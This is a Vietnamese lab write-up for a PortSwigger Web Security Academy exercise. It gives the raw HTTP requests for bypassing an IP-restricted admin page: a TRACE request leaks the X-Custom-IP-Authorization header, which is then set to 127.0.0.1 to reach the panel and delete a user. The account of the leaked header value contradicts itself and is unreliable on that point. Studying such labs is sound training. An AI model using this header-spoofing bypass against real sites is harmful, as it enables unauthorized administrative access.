![[auth-info-disclosure.png]]
-mô tả lab: trang admin `/admin` chỉ cho `127.0.0.1` vào. Nhưng server lại lộ header bí mật qua method `TRACE`, mình lấy header đó là bypass được.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/authentication/other-mechanisms/lab-authentication-bypass-via-information-disclosure (tên cũ: information disclosure)

### hướng giải
- [ ] mình vào `/admin` bình thường, mình thấy báo `Access denied`
- [ ] mình thử thêm `X-Forwarded-For: 127.0.0.1`, vẫn không được
- [ ] mình đọc JS ở trang chủ, sau khi quan sát file này, mình thấy có đoạn comment nhắc tới `TRACE` và `X-Custom-IP-Authorization`
- [ ] mình thử gửi `TRACE /admin`, mình thấy response nó echo lại toàn bộ header + thêm 1 header lạ `X-Custom-IP-Authorization: SECRET123`
- [ ] => nên mình đoán là admin check bằng header này, mình chỉ cần thêm nó với giá trị `127.0.0.1` là vào được

### giải
-bước 1: mình gửi:
```
TRACE /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
```
-response trả về:
```
HTTP/1.1 200 OK
...
X-Custom-IP-Authorization: 7h9s... (1 giá trị bí mật)
```
![[auth-trace-leak.png]]
-sau khi quan sát gói tin này, mình thấy server tự lộ header custom. Mình copy giá trị đó.

-bước 2: mình gửi lại request admin kèm header vừa lấy:
```
GET /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_CUA_MINH
X-Custom-IP-Authorization: 127.0.0.1
```
![[auth-admin-bypass.png]]
-sau khi quan sát gói tin trả về này, mình thấy nó hiện luôn admin panel, có nút delete user `carlos`. Mình click delete là solve lab.

> [!NOTE]
> -bài học của mình: method `TRACE` rất nguy hiểm vì nó echo lại request, dễ lộ header nội bộ. Nên tắt `TRACE` trên production.
